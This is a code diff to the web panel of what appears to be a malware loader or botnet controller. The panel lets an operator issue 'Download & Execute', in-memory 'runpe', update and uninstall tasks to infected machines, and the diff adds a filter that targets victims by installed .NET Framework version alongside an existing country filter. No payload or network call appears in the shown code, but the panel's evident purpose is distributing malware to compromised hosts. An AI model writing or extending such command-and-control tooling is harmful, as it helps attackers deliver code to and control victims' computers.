@@ -14,7 +14,7 @@
           <select name="task" class="custom-select" id="inputGroupSelect01">
             <option selected disabled>Task method</option>
             <option value="dande">Download & Execute</option>
-            <option value="runpe">Download & Execute in Memory</option>
+            <option value="runpe">Download & Execute in Memory (Native Only)</option>
             <option value="update">Update</option>
             <option value="uninstall">Uninstall</option>
           </select>
@@ -101,7 +101,7 @@
 
           var enablecountyFilter = {$showCountryFilter};
           if(enablecountyFilter){
-              $("#inputs").append('<label class="form-check-label"> <input id="enableCountryFilter" type="checkbox" class="form-check-input"> Enable Country Filter   <span class="checkmark"></span></label>');
+              $("#inputs").append('<label class="form-check-label"> <input id="enableCountryFilter" type="checkbox" class="form-check-input"> Country Filter   <span class="checkmark"></span></label>');
 
               $( "#enableCountryFilter" ).change(function() {
                   if($(this).is(":checked")) {
@@ -110,6 +110,19 @@
                       $("#countyfilter").remove();
                   }
               });
+
+
+              //Net Framework Filter
+
+              $("#inputs").append('<label class="form-check-label"> <input id="enableNetFrameworkFilter" type="checkbox" class="form-check-input"> .Net Framework Filter <span class="checkmark"></span></label>');
+              $( "#enableNetFrameworkFilter" ).change(function() {
+                  if($(this).is(":checked")) {
+                      addNetFrameworkfilter();
+                  }else{
+                      $("#netFrameworkFilter").remove();
+                  }
+              });
+
           }
 
           //Net Framework Filter
@@ -139,6 +152,24 @@
             },
         });
 
+    }
+    
+    function addNetFrameworkfilter() {
+        $('#inputs .inputs-inner').append(' <div id="netFrameworkFilter"> ' +
+            '<div class="form-group"><select name="netFramwork-filter[]" id="multiple-frameworks" multiple="multiple">\n' +
+            '        <option value="net2" >.Net Framwork 2</option>\n' +
+            '        <option value="net3" >.Net Framwork 3</option>\n' +
+            '        <option value="net35" >.Net Framwork 35</option>\n' +
+            '        <option value="net4" >.Net Framwork 4</option>\n' +
+            '    </select></div></div>');
+
+
+        $('#multiple-frameworks').multiselect({
+            nonSelectedText: 'Select .Net Frameworks!',
+            includeSelectAllOption: true,
+            enableFiltering: true,
+            enableHTML: true,
+        });
     }
 
 
